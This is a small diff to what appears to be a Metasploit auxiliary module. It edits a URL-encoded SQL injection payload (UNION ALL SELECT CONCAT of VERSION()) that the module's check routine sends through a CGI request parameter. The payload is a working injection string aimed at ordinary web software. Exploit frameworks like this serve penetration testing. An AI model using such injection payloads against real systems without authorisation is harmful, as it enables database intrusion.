@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def check
     payload = datastore['CATEGORYID'].to_s
-    payload << "0%29%20UNION%20ALL%20SELECT%20CONCAT%280x71636f7471%2CIFNULL%28CAST%28VERSION%28%29%20"
+    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x71636f7471%2CIFNULL%28CAST%28VERSION%28%29%20"
     payload << "AS%20CHAR%29%2C0x20%29%2C0x7165776271%29%23"
 
     resp = send_request_cgi({
